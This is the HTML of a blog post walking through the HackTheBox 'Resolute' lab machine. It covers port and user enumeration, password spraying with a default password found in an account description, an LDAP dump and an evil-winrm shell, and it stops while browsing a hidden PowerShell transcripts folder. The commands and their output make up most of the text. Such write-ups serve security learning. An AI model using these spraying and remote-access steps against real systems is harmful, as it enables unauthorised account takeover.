@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Resolute just retired on Hackthebox, it’s a medium difficulty Windows box. Still being a bit new to the Windows environment the enumeration process got a bit long and tedious for me at some point bu">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Resolute">
+<meta property="og:url" content="https://hg8.sh/posts/resolute/index.html">
+<meta property="og:site_name" content="hg8&#39;s Notes — My notes about infosec world. Pentest&#x2F;Bug Bounty&#x2F;CTF Writeups.">
+<meta property="og:description" content="Resolute just retired on Hackthebox, it’s a medium difficulty Windows box. Still being a bit new to the Windows environment the enumeration process got a bit long and tedious for me at some point bu">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/83137834-1b5b9680-a0ea-11ea-9d75-c5ad50234910.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/83160734-d9d9e400-a107-11ea-80c2-f8ef730f41f9.png">
+<meta property="article:published_time" content="2020-05-29T22:00:00.000Z">
+<meta property="article:modified_time" content="2020-05-29T07:45:35.984Z">
+<meta property="article:author" content="hg8">
+<meta property="article:tag" content="windows">
+<meta property="article:tag" content="SMB">
+<meta property="article:tag" content="RPC">
+<meta property="article:tag" content="crackmapexec">
+<meta property="article:tag" content="evil-winrm">
+<meta property="article:tag" content="ldap">
+<meta property="article:tag" content="resolute">
+<meta property="article:tag" content="ldapdomaindump">
+<meta property="article:tag" content="enum4linux">
+<meta property="article:tag" content="winrm">
+<meta property="article:tag" content="dns">
+<meta property="article:tag" content="dnsadmin">
+<meta property="article:tag" content="dll">
+<meta property="article:tag" content="dll injection">
+<meta property="article:tag" content="msfvenom">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://user-images.githubusercontent.com/9076747/83137834-1b5b9680-a0ea-11ea-9d75-c5ad50234910.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+     
+    <title>HackTheBox - Resolute :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+    
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="hg8's Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups." type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/posts/obscurity/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+    </span>
+    <br/>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Brute-force-using-default-password"><span class="toc-number">1.2.</span> <span class="toc-text">Brute-force using default password</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LDAP-Dump"><span class="toc-number">1.3.</span> <span class="toc-text">LDAP Dump</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shell-as-Melanie"><span class="toc-number">1.4.</span> <span class="toc-text">Shell as Melanie</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-FLag"><span class="toc-number">2.</span> <span class="toc-text">Root FLag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-melanie-gt-ryan"><span class="toc-number">2.2.</span> <span class="toc-text">Pivot melanie -&gt; ryan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS-Admin-Privilege-escalation"><span class="toc-number">2.3.</span> <span class="toc-text">DNS Admin Privilege escalation</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        <header id="header">
+  <a href="/">
+  
+      <div id="logo" style="background-image: url(/images/logo.webp);"></div>
+  
+    <span class="logo__mark"></span>
+    <span class="logo__text">./hg8.sh</span>
+    <span class="logo__cursor"></span>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
+      </li>
+       
+        <li><a href="/">Home</a></li>
+       
+        <li><a href="/about/">About</a></li>
+       
+        <li><a href="/archives/">Posts</a></li>
+       
+        <li><a href="/search/">Search</a></li>
+      
+    </ul>
+  </div>
+</header>
+
+        
+          <br>
+          <br>
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        HackTheBox - Resolute
+    </h1>
+
+
+
+    <div class="meta"> 
+      
+    <div class="postdate">
+      
+        <time datetime="2020-05-29T22:00:00.000Z" itemprop="datePublished">30-05-2020</time>
+        
+      
+    </div>
+
+
+      — Written by 
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">hg8</span>
+      </span>
+      —
+      13 min read
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <img width="583" alt="Screenshot 2020-05-28 at 13 49 49" src="https://user-images.githubusercontent.com/9076747/83137834-1b5b9680-a0ea-11ea-9d75-c5ad50234910.png">
+
+<p>Resolute just retired on Hackthebox, it’s a medium difficulty Windows box. Still being a bit new to the Windows environment the enumeration process got a bit long and tedious for me at some point but in the end I managed to see real life scenarios and access to <code>root</code>, or should I say <code>SYSTEM</code>. I would recommend this box if you are confortable on easy boxes and want to level up to a medium one.</p>
+<p><strong>Tl;Dr:</strong> To get the user flag you first had to enumerate users using RPC, doing so you find a default password in one user description field. This password allows you to connect to <code>Melanie</code> user through WinRM and get the user flag.<br>For the root flag you first have to pivot to <code>Ryan</code> user using his credentials hard-coded in a Powershell script transcript. <code>Ryan</code> being a DNS Admin we can exploit a DLL Injection attack into the DNS service running as SYSTEM to execute a privileged reverse shell and grab the root flag.</p>
+<p>Alright! Let’s get into the details now!</p>
+<hr>
+<p>First thing first, let’s add the box IP to the hosts file:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"10.10.10.169 resolute.htb"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p>and let’s start!</p>
+<h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC --top-ports 10000 resolute.htb                                                     </span><br><span class="line">Nmap scan report <span class="keyword">for</span> resolute.htb (10.10.10.169)</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">53/tcp    open  tcpwrapped</span><br><span class="line">88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-05-28 13:32:03Z)</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf       .NET Message Framing</span><br><span class="line">47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-os-discovery:</span><br><span class="line">|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)</span><br><span class="line">|   Computer name: Resolute</span><br><span class="line">|   NetBIOS computer name: RESOLUTE\x00</span><br><span class="line">|   Domain name: megabank.local</span><br><span class="line">|_  Forest name: megabank.local</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 150.18 seconds</span><br></pre></td></tr></table></figure>
+
+<p>So the box is running <code>Windows Server 2016 Standard 14393</code> and have several common port open that will probably come useful later like <code>rpc</code>, <code>ldap</code> or <code>winrm</code>. Yet we don’t have FTP, HTTP nor SSH port open so let’s continue our enumeration to grab more information about this box.</p>
+<p>Since port <code>135</code> RPC is open we should be able to enumerate users, let’s run <code>enum4linux</code> to see what we can get:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ enum4linux 10.10.10.169 2&gt;/dev/null</span><br><span class="line">Starting enum4linux v0.8.9 </span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line"> =============================</span><br><span class="line">|    Users on 10.10.10.169    |</span><br><span class="line"> =============================</span><br><span class="line">index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail      Name: (null)    Desc: (null)</span><br><span class="line">index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account <span class="keyword">for</span> administering the computer/domain</span><br><span class="line">index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela       Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette      Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika       Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire       Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude       Name: (null)    Desc: (null)</span><br><span class="line">index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.</span><br><span class="line">index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia      Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred Name: (null)    Desc: (null)</span><br><span class="line">index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account <span class="keyword">for</span> guest access to the computer/domain</span><br><span class="line">index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo      Name: (null)    Desc: (null)</span><br><span class="line">index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account</span><br><span class="line">index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus       Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password <span class="built_in">set</span> to Welcome123!</span><br><span class="line">index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie      Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki        Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo        Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per  Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan  Name: Ryan Bertrand     Desc: (null)</span><br><span class="line">index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally        Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon        Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve        Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie       Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita       Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf  Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach Name: (null)    Desc: (null)</span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">enum4linux complete</span><br></pre></td></tr></table></figure>
+
+<p>We notice something very interesting on <code>marko</code> user:</p>
+<blockquote>
+<p>Desc: Account created. Password set to Welcome123!</p>
+</blockquote>
+<p>Looks like new accounts get a default password set to <code>Welcome123!</code>. </p>
+<p>Since we have port WinRM port 5985 open maybe we can list <code>marko</code> files:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ smbclient -U <span class="string">'marko'</span> //10.10.10.169/c$</span><br><span class="line">Enter MYGROUP\marko<span class="string">'s password: Welcome123!</span></span><br><span class="line"><span class="string">session setup failed: NT_STATUS_LOGON_FAILURE</span></span><br></pre></td></tr></table></figure>
+
+<p>No luck here. Seems like <code>marko</code> either already change his password… </p>
+<h3 id="Brute-force-using-default-password"><a href="#Brute-force-using-default-password" class="headerlink" title="Brute-force using default password"></a>Brute-force using default password</h3><p>Since <code>Welcome123!</code> seems to be the default password for newly created accounts maybe other users still uses this password ?</p>
+<p>With the list of users we retrieve earlier let’s run <code>crackmapexec</code> to see if any account can login with <code>Welcome123!</code> :</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ crackmapexec smb 10.10.10.169 -u users.txt -p password.txt</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [*] Windows Server 2016 Standard 14393 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\Administrator:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\Guest:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\krbtgt:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\DefaultAccount:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\ryan:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\sunita:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\abigail:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\marcus:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\sally:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\fred:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\angela:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\felicia:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\gustavo:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\ulf:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\stevie:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\claire:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\paulo:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\steve:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\annette:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\annika:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\per:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [+] megabank.local\melanie:Welcome123!</span><br></pre></td></tr></table></figure>
+
+<p>Bingo! We have <code>Melanie</code> account credentials. What now?</p>
+<h3 id="LDAP-Dump"><a href="#LDAP-Dump" class="headerlink" title="LDAP Dump"></a>LDAP Dump</h3><p>Since <code>ldap</code> port is open let’s dump Active Directory information from it using <code>ldapdomaindump</code>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ldapdomaindump -u MEGABANK\\melanie 10.10.10.169</span><br><span class="line">Password:</span><br><span class="line">[*] Connecting to host...</span><br><span class="line">[*] Binding to host</span><br><span class="line">[+] Bind OK</span><br><span class="line">[*] Starting domain dump</span><br><span class="line">[+] Domain dump finished</span><br></pre></td></tr></table></figure>
+
+<p>We can now open an <code>python</code> http server to take a look at the informations nicely formatted in HTML format:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure>
+
+<p>Browsing to <code>domain_users_by_group.html</code> we notice that <code>Melanie</code> belongs to “Remote Management Users”:</p>
+<img width="1106" alt="resolute ldapdump" src="https://user-images.githubusercontent.com/9076747/83160734-d9d9e400-a107-11ea-80c2-f8ef730f41f9.png">
+
+
+
+<h3 id="Shell-as-Melanie"><a href="#Shell-as-Melanie" class="headerlink" title="Shell as Melanie"></a>Shell as Melanie</h3><p>Since <code>melanie</code> is part of Remote Management Users and WinRM port is open we can probably use it to get a shell:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">hg8</span>@<span class="type">archbook</span> ~]<span class="variable">$</span> evil<span class="literal">-winrm</span> <span class="literal">-i</span> <span class="number">10.10</span>.<span class="number">10.169</span> <span class="literal">-u</span> melanie <span class="literal">-p</span> <span class="string">"Welcome123\!"</span></span><br><span class="line"></span><br><span class="line">Evil<span class="literal">-WinRM</span> shell v2.<span class="number">3</span></span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* PS C:\Users\melanie\Documents&gt; type ..\Desktop\user.txt</span><br><span class="line"><span class="number">0</span>xxxxxxxxxxxxxxxxxx0</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Root-FLag"><a href="#Root-FLag" class="headerlink" title="Root FLag"></a>Root FLag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>Looking around we notice another user account named <code>Ryan</code>:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* PS C:\&gt; dir C:\Users</span><br><span class="line"></span><br><span class="line">    Directory: C:\Users</span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----        <span class="number">9</span>/<span class="number">25</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">43</span> AM                Administrator</span><br><span class="line">d-----        <span class="number">12</span>/<span class="number">4</span>/<span class="number">2019</span>   <span class="number">2</span>:<span class="number">46</span> AM                melanie</span><br><span class="line">d<span class="literal">-r</span>---       <span class="number">11</span>/<span class="number">20</span>/<span class="number">2016</span>   <span class="number">6</span>:<span class="number">39</span> PM                Public</span><br><span class="line">d-----        <span class="number">9</span>/<span class="number">27</span>/<span class="number">2019</span>   <span class="number">7</span>:<span class="number">05</span> AM                ryan</span><br></pre></td></tr></table></figure>
+
+<p>We are probably going to have to pivot to his account. Let’s keep that in mind and continue our recon process.</p>
+<h3 id="Pivot-melanie-gt-ryan"><a href="#Pivot-melanie-gt-ryan" class="headerlink" title="Pivot melanie -&gt; ryan"></a>Pivot melanie -&gt; ryan</h3><p>Digging in we found an uncommon hidden folder named <code>PSTranscripts</code> at the root of <code>C:\</code>:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* PS C:\&gt; ls <span class="literal">-Hidden</span></span><br><span class="line"></span><br><span class="line">    Directory: C:\</span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-<span class="literal">-hs</span>-        <span class="number">12</span>/<span class="number">3</span>/<span class="number">2019</span>   <span class="number">6</span>:<span class="number">40</span> AM                <span class="variable">$RECYCLE</span>.BIN</span><br><span class="line">d-<span class="literal">-hsl</span>        <span class="number">9</span>/<span class="number">25</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">17</span> AM                Documents and Settings</span><br><span class="line">d-<span class="literal">-h</span>--        <span class="number">9</span>/<span class="number">25</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">48</span> AM                ProgramData</span><br><span class="line">d-<span class="literal">-h</span>--        <span class="number">12</span>/<span class="number">3</span>/<span class="number">2019</span>   <span class="number">6</span>:<span class="number">32</span> AM                PSTranscripts</span><br><span class="line">d-<span class="literal">-hs</span>-        <span class="number">9</span>/<span class="number">25</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">17</span> AM                Recovery</span><br><span class="line">d-<span class="literal">-hs</span>-        <span class="number">9</span>/<span class="number">25</span>/<span class="number">2019</span>   <span class="number">6</span>:<span class="number">25</span> AM                System Volume Information</span><br><span class="line"><span class="literal">-arhs</span>-       <span class="number">11</span>/<span class="number">20</span>/<span class="number">2016</span>   <span class="number">5</span>:<span class="number">59</span> PM         <span class="number">389408</span> bootmgr</span><br><span class="line"><span class="literal">-a</span><span class="literal">-hs</span>-        <span class="number">7</span>/<span class="number">16</span>/<span class="number">2016</span>   <span class="number">6</span>:<span class="number">10</span> AM              <span class="number">1</span> BOOTNXT</span><br><span class="line"><span class="literal">-a</span><span class="literal">-hs</span>-        <span class="number">5</span>/<span class="number">28</span>/<span class="number">2020</span>   <span class="number">4</span>:<span class="number">52</span> AM      <span class="number">402653184</span> pagefile.sys</span><br></pre></td></tr></table></figure>
+
+<p>Navigating to this folder we stumble upon a Powershell transcript text file:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* PS C:\PSTranscripts\<span class="number">20191203</span>&gt; ls <span class="literal">-Hidden</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\PSTranscripts\<span class="number">20191203</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line"><span class="literal">-arh</span>--        <span class="number">12</span>/<span class="number">3</span>/<span class="number">2019</span>   <span class="number">6</span>:<span class="number">45</span> AM           <span class="number">3732</span> PowerShell_transcript.RESOLUTE.OJuoBGhU.<span class="number">20191203063201</span>.txt</span><br></pre></td></tr></table></figure>
+
+<p>Let’s read the full transcript:</p>
